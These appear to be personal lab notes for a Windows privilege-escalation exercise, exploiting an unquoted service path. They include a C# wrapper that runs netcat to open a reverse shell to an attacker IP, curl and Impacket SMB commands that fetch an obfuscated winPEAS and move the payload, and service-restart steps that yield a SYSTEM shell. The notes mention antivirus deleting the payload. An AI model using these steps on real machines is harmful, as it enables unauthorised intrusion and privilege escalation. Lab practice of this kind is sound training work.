with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we _already have on the target._

Will install Mono to compile the binary
```
sudo apt install mono-devel
```

After the installation we have to open this file Wrapper.cs

```
using System;  
using System.Diagnostics;
```

These allow us to start new processes (i.e. execute netcat).

As i am feeling sleepy will start it tomorrow after the doctor's appointment


This means that we can create our unquoted service path exploit, but we could also perform attacks such as DLL hijacking, or even outright replacing the service executable with a malicious binary.

```
curl http://10.50.102.187/winPEASx64_ofs.exe -o C:\xampp\htdocs\resources\uploads\sardarji-win.exe
```

Finally able to run the winpeas ofs file aka obfuscated file
![[Pasted image 20240121013007.png]]

As you can see there is lot of vulnerability's here due to not upto date patching and updating of files
![[Pasted image 20240121013107.png]]

This is what we have found earlier and verified by the user
![[Pasted image 20240121013347.png]]

![[Pasted image 20240121013522.png]]

Will make a file with name wrapper.cs
```
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe", "10.50.102.187 4444 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

```
gedit Wrapper.cs
```
```
mcs Wrapper.cs
```
![[Pasted image 20240121215236.png]]

Now will learn a new way to transfer the file for that will use Impacket toolkit
Impacket SMB server

```
python /opt/impacket-0.9.19/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
```


```
net use \\10.50.102.187\share /USER:user s3cureP@ssword
```

```
copy \\10.50.102.187\share\Wrapper.exe %TEMP%\wrapper-sardarji.exe
```
![[Pasted image 20240121215947.png]]

It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let's leave it up for now.

```
net use \\10.50.102.187\share /del
```
![[Pasted image 20240121220114.png]]
But will delete it for now 

```
"%TEMP%\wrapper-sardarji.exe"
```
![[Pasted image 20240121220608.png]]

![[Pasted image 20240121220629.png]]
Volla we got the reverse shell but still we are not the root user.

So it's now time to exploit that unquoted service path vulnerability!

This is the path
```
C:\Program Files (x86)\System Explorer\SystemExplorer\service\SystemExplorerService64.exe
```
There are technically three places we _could_ add our program here:
If you recall we have already checked the write permission of SystemExplorer and we have full access.

```
copy %TEMP%\wrapper-sardarji.exe "C:\Program Files (x86)\System Explorer\System.exe"
```
![[Pasted image 20240121224707.png]]

Now will check if we have copied the file or not 
```
dir "C:\Program Files (x86)\System Explorer\"
```
![[Pasted image 20240121224811.png]]

![[Pasted image 20240121225208.png]]
We have 5 minute time otherwise the script will be deleted by the AV

```
sc stop SystemExplorerHelpService
```

```
sc start SystemExplorerHelpService
```

![[Pasted image 20240121225354.png]]

Guess what we have the reverse shell but with root authority
![[Pasted image 20240121225444.png]]

Now we need to delete the wrapper file as it's not a window's file that's why we got the error in the first place and it's a good habit to do that.
```
del "C:\Program Files (x86)\System Explorer\System.exe"
```

```
sc start SystemExplorerHelpService
```

>[! question] **Bonus Question (optional):**
>Research how to write a real Windows Service executable in C# and try to create a wrapper (or even a full reverse shell!) that doesn't cause the `sc start` command to error out.

- [ ] Bonus question

This is make a new user with a know password but it will bypass the AV so will keep it in our back pocket for now.
